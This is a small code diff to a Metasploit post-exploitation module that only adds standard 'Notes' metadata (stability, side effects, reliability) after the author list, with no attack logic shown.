@@ -22,7 +22,12 @@ class MetasploitModule < Msf::Post
         'Author' => [
           'Ben Turner benpturner[at]yahoo.com',
           'Dave Hardy davehardy20[at]gmail.com'
-        ]
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
 
